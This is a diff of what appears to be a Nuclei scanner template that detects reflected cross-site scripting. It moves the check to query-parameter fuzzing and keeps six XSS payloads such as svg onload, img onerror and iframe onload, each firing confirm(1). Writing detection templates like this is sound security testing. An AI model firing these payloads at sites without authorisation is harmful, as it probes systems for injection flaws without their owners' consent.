@@ -9,24 +9,35 @@ info:
     - 
   tags: xss
 
-requests:
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+
+http:
   - method: GET
-
     path:
-    
-      - "{{BaseURL}}'><Svg Only=1 OnLoad=confirm(1)>"
-      - "{{BaseURL}}'><details/open/ontoggle=confirm(1)>"
-      - "{{BaseURL}}'><svg><circle><set onbegin=confirm(1) attributename=fill>"
-      - "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
-      - "{{BaseURL}}'</script><img src=x onerror=confirm(1)>"
-      - "{{BaseURL}}'<iframe/onload=confirm(1)>"
+      - "{{BaseURL}}"
+    payloads:
+      reflection:
+      - "'><Svg Only=1 OnLoad=confirm(1)>"
+      - "'><details/open/ontoggle=confirm(1)>"
+      - "'><svg><circle><set onbegin=confirm(1) attributename=fill>"
+      - "'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
+      - "'</script><img src=x onerror=confirm(1)>"
+      - "'<iframe/onload=confirm(1)>"
+    stop-at-first-match: true
 
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-            - "confirm(1)"
+          - "{{reflection}}"
 
         condition: and
       - type: status
